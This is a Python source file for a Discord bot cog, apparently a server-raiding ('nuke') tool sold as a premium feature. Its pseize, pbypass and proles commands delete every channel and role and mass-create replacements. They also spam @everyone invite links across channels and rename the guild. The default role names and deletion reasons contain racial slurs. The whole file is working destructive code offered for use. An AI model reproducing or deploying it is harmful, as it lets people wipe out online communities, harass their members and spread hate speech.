import discord
from discord.ext import commands
import aiohttp
import asyncio
import json
from datetime import datetime

class a(commands.Cog):
    def __init__(b,c):
        b.d=c

    def e(b,f):
        try:
            with open('premium_users.json','r')as g:
                h=json.load(g)
        except(FileNotFoundError,json.JSONDecodeError):
            h=[]
        return f.author.id in h or f.author.id in b.d.ownerUsers

    @commands.command()
    @commands.cooldown(1,120,commands.BucketType.guild)
    async def pseize(b,f):
        if not b.e(f):
            await f.send("<:cancel:1383448034829926481> Premium only.")
            return
        if f.author.id in b.d.ownerUsers:f.command.reset_cooldown(f)
        b.d.nukeType="premium"
        if f.guild.id in b.d.exemptGuilds:return await f.send("```This server is protected and cannot be nuked.```")
        if not f.guild.me.guild_permissions.manage_channels:
            await f.send("<:cancel:1383448034829926481>  I need Manage Channels permission.")
            return
        await f.message.delete()
        i=str(f.author.id)
        j=b.d.userConfigs.get(i,{})
        k=j.get('nuke_msg',"@everyone https://discord.gg/ccdyKy2mFA")
        l=j.get('nuke_ch_name',"［🇸🇦］̷raped-by-sanity")
        b.d.currentNukeMsg=k
        b.d.nukeActive=True
        b.d.nukeTasks=[]
        m=f.guild
        n={"Authorization":f"Bot {b.d.http.token}","Content-Type":"application/json"}
        async def o(p):
            try:
                async with aiohttp.ClientSession()as q:await q.delete(f"https://discord.com/api/v10/channels/{p.id}",headers=n)
            except:pass
        async def r(m,s):
            try:
                async with aiohttp.ClientSession()as q:
                    t={"name":s,"type":0}
                    await q.post(f"https://discord.com/api/v10/guilds/{m.id}/channels",headers=n,json=t)
            except:pass
        u=[l]
        v=[o(w)for w in m.channels]
        await asyncio.gather(*v)
        x=[r(m,u[y%len(u)])for y in range(50)]
        await asyncio.gather(*x)
        try:
            aa=m.name
            b.d.oldNames[m.id]=aa
            await m.edit(name="［🍔］̷sanity-owns-cord")
        except:pass

    @commands.command()
    @commands.cooldown(1,120,commands.BucketType.guild)
    async def pbypass(b,f):
        if not b.e(f):
            await f.send("<:cancel:1383448034829926481> Premium only.")
            return
        if f.guild.id in b.d.exemptGuilds:return await f.send("This server is protected and cannot be nuked.")
        await f.message.delete()
        i=str(f.author.id)
        j=b.d.userConfigs.get(i,{})
        ab=j.get('bypass_ch_name',"︱［🔥］killed-by-sanity")
        ac=j.get('bypass_msg',"@everyone https://discord.gg/ccdyKy2mFA")
        async def ad(ae):
            try:
                await ae.edit(name=ab)
                for _ in range(30):await ae.send(ac)
            except:pass
        af=[ad(ag)for ag in f.guild.text_channels]
        await asyncio.gather(*af)

    @commands.command()
    @commands.cooldown(1,120,commands.BucketType.guild)
    async def proles(b,f):
        if not b.e(f):
            await f.send("<:cancel:1383448034829926481> Premium only.")
            return
        if not f.guild.me.guild_permissions.manage_roles:return await f.send("<a:762_alert:1382770261597884558> Missing Manage Roles permission.")
        await f.message.delete()
        i=str(f.author.id)
        j=b.d.userConfigs.get(i,{})
        ah=j.get('role_name',"i-hate-niggers")
        ai=[aj for aj in f.guild.roles if aj!=f.guild.default_role and aj.position<f.guild.me.top_role.position]
        for ak in range(0,len(ai),20):
            al=ai[ak:ak+20]
            await asyncio.gather(*[am.delete(reason="try harder finding the reason nigger")for am in al])
            await asyncio.sleep(1)
        for ak in range(0,150,10):
            an=min(10,150-ak)
            await asyncio.gather(*[f.guild.create_role(name=f"{ah}-{ak+ao}")for ao in range(an)])
            await asyncio.sleep(0.5)

    @commands.command()
    async def config(b,f):
        if not b.e(f):
            await f.send("<:cancel:1383448034829926481> Premium only.")
            return
        try:
            await f.send("Check your dms.")
            await f.author.send("**What is your nuke message for +pseize? (the content to send)**")
            ap=await b.d.wait_for('message',check=lambda m:m.author==f.author and isinstance(m.channel,discord.DMChannel),timeout=300.0)
            aq=ap.content
            await f.author.send("**What is your channel name for +pseize?**")
            ap=await b.d.wait_for('message',check=lambda m:m.author==f.author and isinstance(m.channel,discord.DMChannel),timeout=300.0)
            ar=ap.content
            await f.author.send("**What is your bypass message for +pbypass?**")
            ap=await b.d.wait_for('message',check=lambda m:m.author==f.author and isinstance(m.channel,discord.DMChannel),timeout=300.0)
            as_=ap.content
            await f.author.send("**What is your bypass channel name for +pbypass?**")
            ap=await b.d.wait_for('message',check=lambda m:m.author==f.author and isinstance(m.channel,discord.DMChannel),timeout=300.0)
            at=ap.content
            await f.author.send("**What is your role name for +proles?**")
            ap=await b.d.wait_for('message',check=lambda m:m.author==f.author and isinstance(m.channel,discord.DMChannel),timeout=300.0)
            au=ap.content
            i=str(f.author.id)
            if i not in b.d.userConfigs:b.d.userConfigs[i]={}
            b.d.userConfigs[i]['nuke_msg']=aq
            b.d.userConfigs[i]['nuke_ch_name']=ar
            b.d.userConfigs[i]['bypass_msg']=as_
            b.d.userConfigs[i]['bypass_ch_name']=at
            b.d.userConfigs[i]['role_name']=au
            with open('user_configs.json','w')as g:json.dump(b.d.userConfigs,g)
            await f.send("```Config saved successfully!```")
        except asyncio.TimeoutError:
            await f.send("Config setup timed out.")
            try:await f.author.send("Setup timed out. Please run +config again.")
            except:pass

def setup(c):
    c.add_cog(a(c))